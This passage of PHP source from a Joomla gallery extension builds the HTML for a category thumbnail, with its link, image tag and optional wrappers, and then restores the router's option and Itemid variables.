          $link = JRoute::_('&view=category&catid='.$obj->catid.$this->getJoomId()."&");

        }
        else
        {
          // $link = JHTML::_('joomgallery.openimage', $this->_config['openimage'], $obj, $type, $this->getConfig('group'));
          $link = JHTML::_('joomgallery.openimage', $this->_config['openimage'], $obj, false, $this->getConfig('group'));
        }

        $output .= '  <a href="'.$link.'" class="jg_catelem_photo">';
      }
      if($class)
      {
        $class = ' '.$class;
      }
      if($extra)
      {
        $extra = ' '.$extra;
      }
      $imgtype = 'thumb_url';
      if($type != false)
      {
        $imgtype = $type . '_url';
      }
      $output   .= '    <img src="'.$this->_ambit->getImg($imgtype, $obj, null, 0, true, $cropimgwidth, $cropimgheight, $cropimgpos).'" class="jg_photo'.$class.'" alt="'.$obj->imgtitle.'"'.$extra.' />';
      if($linked)
      {
        $output .= '  </a>';
      }
      if($div)
      {
        $output .= '</div>';
      }
      $routervars = $router->getVars();
      if(is_null($option))
      {
        // Delete the var from array
        unset($routervars['option']);
      }
      else
      {
        $routervars['option'] = $option;
      }
      if(is_null($Itemid))
      {
        unset($routervars['Itemid']);
      }
      else
      {
        $routervars['Itemid'] = $Itemid;
      }
      $router->setVars($routervars, false);
    }
    else
    {
      $output .= "    &nbsp;\n";
    }
    return $output;
  }
}
